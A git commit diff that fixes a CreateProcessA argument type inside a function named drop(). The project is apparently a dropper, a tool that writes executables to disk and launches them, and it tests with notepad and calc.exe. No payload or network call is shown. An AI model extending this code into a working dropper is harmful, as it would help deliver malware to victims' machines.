a142e3082d430bfe534aac4c8ba3a0440e8c79d0
Adi <adindeshpande@gmail.com>
2026-07-19 15:04:17 -0500

    convert a CreateProcess arguemnt from string to LPCSTR

--- Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
+++ Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
@@ -276,7 +276,7 @@ void drop(int size, void* buffer)
 
         int result = system(cmd.c_str());
 	std::string notepad_test = "notepad.exe " + downloadsPath;
-	BOOL err = CreateProcessA(nullptr, notepad_test, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	BOOL err = CreateProcessA(nullptr, notepad_test.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	std::cout << "This is result: " << result << "\n";
 
         std::string cmpPath = "C:\\Users\\adind\\Dropper\\Walmart-version-of-Dropper\\Linux_mint_22.3\\FileSystem_exe_rebuild\\calc.exe";
